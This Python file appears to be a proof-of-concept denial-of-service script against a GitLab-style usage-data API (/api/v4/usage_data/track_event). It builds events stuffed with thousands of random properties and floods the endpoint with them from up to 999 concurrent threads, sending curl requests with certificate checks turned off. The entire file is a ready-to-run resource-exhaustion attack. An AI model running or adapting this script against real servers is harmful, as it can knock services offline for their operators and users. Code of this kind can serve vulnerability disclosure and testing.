import sys
import random
import string
import json
import subprocess
import tempfile
import os
import threading
import time

def generate_random_string(length):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def generate_event_with_additional_properties(num_properties, key_len=9, value_len=3):
    additional_properties = {}
    for _ in range(num_properties):
        key = generate_random_string(key_len)
        value = generate_random_string(value_len)
        additional_properties[key] = value
    return {
        "event": "click_blame_control_on_blob_page",
        "additional_properties": additional_properties
    }

def send_request(url, token, payload, tmpfile_path):
    curl_command = [
        "curl", "-k", "-X", "POST",
        url,
        "-H", "Content-Type: application/json",
        "-H", f"Authorization: Bearer {token}",
        "--data", f"@{tmpfile_path}"
    ]
    try:
        result = subprocess.run(curl_command, capture_output=True, text=True, check=True)
        print(f"✅ Response from {threading.current_thread().name}:\n{result.stdout.strip()}")
    except subprocess.CalledProcessError as e:
        print(f"❌ Error in {threading.current_thread().name}:\n{e.stderr.strip()}")
    finally:
        os.remove(tmpfile_path)

def worker_thread(url, token, event_data, delay, thread_name):
    print(f"🧵 {thread_name} started.")
    payload = json.dumps(event_data)
    with tempfile.NamedTemporaryFile(delete=False, suffix=".json", mode='w') as tmpfile:
        tmpfile.write(payload)
        tmpfile_path = tmpfile.name
    send_request(url, token, payload, tmpfile_path)
    print(f"🏁 {thread_name} finished.")

def parse_args():
    args = sys.argv[1:]
    arg_map = {}
    expected = {
        '--url': 'url',
        '--token': 'token',
        '--properties': 'properties',
        '--delay': 'delay',
        '--threads': 'threads',
        '--batch': 'batch',
        '--sleep': 'sleep'
    }

    i = 0
    while i < len(args):
        if args[i] in expected:
            key = expected[args[i]]
            i += 1
            if i < len(args):
                arg_map[key] = args[i]
        i += 1

    # Required
    if 'url' not in arg_map or 'token' not in arg_map:
        print("❗ Missing required args: --url and --token")
        print("💡 Example: python poc.py --url https://example.com --token abc123")
        sys.exit(1)

    # Defaults
    arg_map.setdefault('properties', '6660')
    arg_map.setdefault('delay', '1.0')
    arg_map.setdefault('threads', '999')
    arg_map.setdefault('batch', '13')
    arg_map.setdefault('sleep', '3')

    # Convert types
    arg_map['properties'] = int(arg_map['properties'])
    arg_map['delay'] = float(arg_map['delay'])
    arg_map['threads'] = int(arg_map['threads'])
    arg_map['batch'] = int(arg_map['batch'])
    arg_map['sleep'] = int(arg_map['sleep'])

    return arg_map

def main():
    args = parse_args()

    base_url = args['url'].rstrip('/')
    full_url = f"{base_url}/api/v4/usage_data/track_event"
    print(f"🌐 Full API URL: {full_url}")
    print("🚀 Starting event dispatch...")

    event_data = generate_event_with_additional_properties(args['properties'])
    payload = json.dumps(event_data)
    payload_size_kb = len(payload.encode('utf-8')) / 1024
    print(f"📏 Payload size: {payload_size_kb:.2f} KB")

    threads = []
    for i in range(args['threads']):
        name = f"Thread-{i+1}"
        thread = threading.Thread(
            target=worker_thread,
            args=(full_url, args['token'], event_data, args['delay'], name)
        )
        threads.append(thread)
        thread.start()
        time.sleep(args['delay'])

        if (i + 1) % args['batch'] == 0:
            print(f"⏸️ Sleeping {args['sleep']}s after {args['batch']} requests...")
            time.sleep(args['sleep'])

    for thread in threads:
        thread.join()

    print("🎉 All threads completed.")
    input("🔚 Press Enter to exit...")

if __name__ == "__main__":
    main()
